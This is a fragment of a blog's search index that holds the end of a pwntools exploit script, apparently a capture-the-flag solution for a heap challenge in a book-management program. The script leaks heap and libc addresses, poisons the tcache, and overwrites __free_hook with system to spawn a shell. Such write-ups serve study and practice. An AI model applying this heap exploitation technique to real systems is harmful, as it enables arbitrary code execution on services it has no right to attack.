&#x27;)</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">    add(8,&#x27;0&#x27;,0x89,&#x27;0&#x27;)#0</span><br><span class="line">    add(8,&#x27;1&#x27;,0x89,&#x27;1&#x27;)#1</span><br><span class="line">    edit(0,0x18,&#x27;&#x27;)</span><br><span class="line">    edit(1,0x18,&#x27;&#x27;)</span><br><span class="line">    edit(1,0x90,&#x27;&#x27;)</span><br><span class="line">    show(1)</span><br><span class="line">    heapbase = (u64(io.recv(4).ljust(8,&#x27;\x00&#x27;))&gt;&gt;12)&lt;&lt;12</span><br><span class="line">    print(hex(heapbase))</span><br><span class="line">    dele(0)</span><br><span class="line">    dele(0)</span><br><span class="line">    payload = p64(heapbase+0x98)</span><br><span class="line">    edit(1,0x18,payload)</span><br><span class="line">    add(7,&#x27;2&#x27;,0x89,&#x27;2&#x27;)#2</span><br><span class="line">    add(0x10,p64(heapbase+0x10),0x89,p64(heapbase+0x10))#3tcache</span><br><span class="line">    add(8,&#x27;4&#x27;,0xa7,&#x27;\x00&#x27;*0x20+&#x27;\xff&#x27;*0x10+&#x27;\x00&#x27;*0x10+&#x27;\x00&#x27;*0x10)#4</span><br><span class="line">    edit(4,0x18,&#x27;a&#x27;)</span><br><span class="line">    edit(4,0x40,&#x27;&#x27;)</span><br><span class="line">    show(4)</span><br><span class="line">    malloc_hook = (u64(io.recv(6).ljust(8,&#x27;\x00&#x27;))-0xa)+0xa0-96-16</span><br><span class="line">    libcbase = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">    print(hex(libcbase))</span><br><span class="line">    free_hook = libcbase+libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">    system=libcbase+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">    edit(4,0x40,&#x27;\x00&#x27;*0x28+p64(free_hook-0x8))</span><br><span class="line">    #pause()</span><br><span class="line">    add(7,&#x27;5&#x27;,0x27,&#x27;/bin/sh\x00&#x27;+p64(system))</span><br><span class="line">    pause()</span><br><span class="line">    io.sendafter(&#x27;&gt;&gt; &#x27;,&#x27;3 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Select Book ID (0-10): &#x27;,&#x27;5 &#x27;)</span><br><span class="line">    io.sendafter(&#x27;Enter book summary size: &#x27;,&#x27;16 &#x27;)</span><br><span class="line">    io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
